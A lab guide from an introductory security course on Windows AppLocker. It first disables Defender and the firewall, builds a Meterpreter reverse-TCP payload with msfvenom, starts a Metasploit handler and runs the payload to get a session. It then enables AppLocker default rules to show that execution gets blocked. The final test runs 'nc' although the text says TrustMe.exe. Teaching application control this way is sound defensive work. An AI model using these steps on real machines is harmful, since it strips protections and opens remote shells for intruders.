![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)


# AppLocker

Applocker Instructions:

Let’s see what happens when we do not have **AppLocker** running.  We will set up a simple backdoor and have it connect back to the **Kali** system.  Remember, the goal is not to show how we can bypass **EDR** and **Endpoint** products.  It is to create a simple backdoor and have it connect back.

Before we begin, we need to disable **Defender**. Start by opening an instance of **Windows Powershell**. Do this by clicking on the **Powershell** icon in the taskbar.

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/b51c10be-34d9-446a-be52-8ceb319815ac" />



Next, run the following command in the **Powershell** terminal:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

![](attachments/applocker_disabledefender.png)

This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/3d9509ba-9139-4304-8f52-6854fee2b43c" />


```cmd
netsh advfirewall set allprofiles state off
```


Next, set a password for the Administrator account that you can remember

```cmd
net user Administrator password1234
```

Please note, that is a very bad password.  Come up with something better. But, please remember it.




- To open a **Linux Shell**, either **double-click** `Ubuntu Shell` on Desktop

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />


- Or open **Command Prompt**

<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />

- **SSH** into the **Linux** machine
```bash
ssh ubuntu@linux.cloudlab.lan
```

<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />







Let's start by getting root access in our terminal.

```bash
sudo su -
```

Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:

```bash
ifconfig
```

<img width="716" height="175" alt="2026-02-23_10-33" src="https://github.com/user-attachments/assets/eb5b0547-6da5-4f35-8ce4-43580c8a97d7" />


**REMEMBER: YOUR IP WILL BE DIFFERENT**

Now, run the following commands to start a simple backdoor and backdoor listener: 

```bash
cd /tmp/
```

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > TrustMe.exe
```

Let's start the **Metasploit Handler**.  First, open a new **Linux** instance.



- **Double-click** `Ubuntu Shell` on Desktop

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />

<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />



Before doing anything else, we need to run the following command in our new terminal window:

```bash
msfconsole -q
```

<img width="577" height="91" alt="2026-02-23_10-44" src="https://github.com/user-attachments/assets/967b59aa-7a46-4286-9263-25c1bfe77192" />



The **Metasploit Handler** successfully ran if the terminal now starts with **"msf6 >"**

Next, let's run the following:

```bash
use exploit/multi/handler
```

Now run all of the following commands to set the correct parameters:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

```bash
set LHOST [Your Linux IP Address]
```

**REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**

Go ahead and run the exploit:

```bash
exploit
```

It should look like this:

<img width="671" height="192" alt="2026-02-23_10-54" src="https://github.com/user-attachments/assets/4c40211d-7f95-48df-bff5-4a62c261d620" />


Let’s download the malware and run it!

Going back to our **Powershell** terminal, copy the file over from **Linux**

```ps
cd .\Desktop\
```

```ps
scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
```

Open a **Windows** command prompt. 

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/86cb26ca-748a-4d29-9d5b-cdc31d22ca3a" />

Once the prompt is open, let's run the following commands to run the **"TrustMe.exe"** file.

```cmd
cd \Users\Administrator\Desktop
```
 
Then run it with the following:

```cmd
TrustMe.exe
```

![](attachments/runtrustme.png)

Back at your **Linux** terminal, you should now have a **metasploit** session!

![](attachments/meterpretersession.png)

Let’s stop this from happening!

To do this we will need to access the **"Local Security Policy"** on your **Windows** System.

Simply press the Windows key, (lower left hand of your keyboard, looks like a Windows Logo), then type **"Local Security"**.  It should bring up a menu like the one below, please select **"Local Security Policy"**.

![](attachments/localsecuritypolicy.png)

We will need to configure **AppLocker**.  To do this, please go to Security Settings > Application Control Policies > AppLocker.

![](attachments/localsecpolicywindow.png)

Scroll down in the right hand pane. You will see there are **"0 Rules enforced"** for all policies.  We will add in the default rules.  We will choose the defaults because we are far less likely to break a system.

![](attachments/rulesoverview.png)

Please select each of the above Rule groups, **"Executable, Windows Installer, Script, and Packaged,"** and for each one, right click in the area that says **“There are no items to show in this view.”** and then select **“Create Default Rules”**.

![](attachments/createdefaultrules.png)

This should generate a subset of rules for each group.  It should look similar to how it does below: 

![](attachments/appliedrules.png)

For simplicity, you can click the next set of rules from the left panel as seen above.

We now need to enforce the rules:

To do this you will need to select **AppLocker** on the far left pane.  You will need to select **"Configure rule enforcement"**.  This will open a pop-up. Check the **"Configured"** box for each set of rules.  

![](attachments/ruleenforcement.png)

We will need to start the **"Application Identity service"**.  This is done through pressing the Windows key and typing **"Services"**.  

![](attachments/services.png)

This will bring up the **Services App**.  Double-click **“Application Identity”**.

![](attachments/applicationidentity.png)

Once the **"Application Identity Properties"** dialog is open, please press the **Start** button.  This will start the service.

![](attachments/startservice.png)

Open a command prompt and run **"gpupdate"** to force the policy change.

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/50e871b5-a3ec-4c55-92dd-db5fd4a1e1d4" />

```bash
gpupdate /force
```

We are now going to try to run **"TrustMe.exe"** as another user on the system. 

Run the following commands:

```cmd
cd /IntroLabs
```

```cmd
runas /user:whitelist "nc"
```

The password is **adhd**

![](attachments/runas.png)

As you can see, an error was generated, meaning that we were successful!


***                                                                 

<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/bluespawnIntroClass/Bluespawn.md)</i></b>


<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)















